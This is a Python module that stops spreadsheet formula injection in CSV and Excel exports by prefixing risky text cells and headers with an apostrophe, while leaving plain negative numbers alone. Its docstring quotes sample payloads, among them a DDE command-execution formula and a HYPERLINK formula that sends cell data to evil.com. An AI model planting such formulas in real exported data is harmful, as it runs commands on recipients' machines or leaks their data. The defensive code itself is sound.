"""
services/spreadsheet_safety.py — an exported cell is not a formula.

Every export this product offers is aimed at Excel: the CSV even ships a
UTF-8 BOM so Excel opens it in the right encoding. That is the whole
problem. Excel decides a cell is a formula by looking at its first
character, so a value that arrived in an uploaded file as text —

    =cmd|'/c calc'!A1
    @SUM(1:2)
    =HYPERLINK("http://evil.com?d="&A1,"click")

— is stored, analysed and exported unchanged, and becomes executable the
moment the client double-clicks the file we handed them. Measured: an
uploaded CSV containing those three values produced an export containing
those three values, formula characters intact.

The attacker here is whoever supplied the data, and the victim is the
person who receives our export — often not the same person as the one
who uploaded it. A shared spreadsheet, a supplier's price list, a form
export: the upload is not necessarily trusted just because someone with
an account sent it.

The fix is the standard one: a leading apostrophe, which Excel reads as
"this is text" and does not display. It is applied only where the risk
is, so ordinary data comes out unchanged:

  * only to text cells — a numeric -500 is a number, not a formula, and
    is never touched;
  * only to the leading characters Excel actually treats as a formula
    start; and
  * never to a text cell that merely looks like a negative number, so
    "-500" stays "-500" rather than becoming "'-500".
"""
from __future__ import annotations

import logging
import re

import pandas as pd

logger = logging.getLogger(__name__)

# The characters Excel, LibreOffice and Google Sheets treat as the start
# of a formula. Tab and carriage return are here because a leading one
# is stripped on paste and reveals the character after it.
FORMULA_STARTS = ("=", "+", "@", "\t", "\r")

# A leading "-" is a formula start too, but it is also how every
# negative number written as text begins. Escaping "-500" would corrupt
# a column of them for no gain, so the minus case is escaped only when
# what follows is not simply a number.
_PLAIN_NEGATIVE = re.compile(r"^-\d[\d,._\s]*$")


def is_risky_cell(value) -> bool:
    """True when a cell would be read as a formula by a spreadsheet."""
    if not isinstance(value, str):
        return False
    text = value.lstrip("﻿")
    if not text:
        return False
    if text[0] in FORMULA_STARTS:
        return True
    return text[0] == "-" and not _PLAIN_NEGATIVE.match(text)


def neutralise(value):
    """One cell, made inert. Non-strings pass through untouched."""
    return "'" + value if is_risky_cell(value) else value


def safe_for_export(df: pd.DataFrame) -> tuple[pd.DataFrame, int]:
    """A copy of `df` safe to hand to a spreadsheet, and how many cells
    were changed.

    The count is returned rather than logged and forgotten: an export
    that quietly altered someone's data should be able to say so, and a
    non-zero count on a normal dataset is a signal the rule is too
    broad.
    """
    out = df.copy()
    changed = 0
    for col in out.columns:
        series = out[col]
        # Not `dtype != object`: this project stores text columns with
        # pandas' StringDtype, so an object-only check skipped every
        # column it was written to protect and reported zero changes on
        # a frame full of formulas.
        if not (pd.api.types.is_object_dtype(series)
                or pd.api.types.is_string_dtype(series)):
            continue
        try:
            risky = series.map(is_risky_cell)
        except Exception:
            logger.debug("formula scan failed for column %r", col, exc_info=True)
            continue
        hits = int(risky.sum())
        if hits:
            out[col] = series.mask(risky, series.map(neutralise))
            changed += hits
    if changed:
        logger.info("export: neutralised %d cell(s) that a spreadsheet "
                    "would have run as a formula", changed)
    return out, changed


def safe_columns(columns) -> list:
    """Header row, same treatment — a column NAME can carry a formula
    too, and it lands in row 1 of the export."""
    return [neutralise(str(c)) for c in columns]
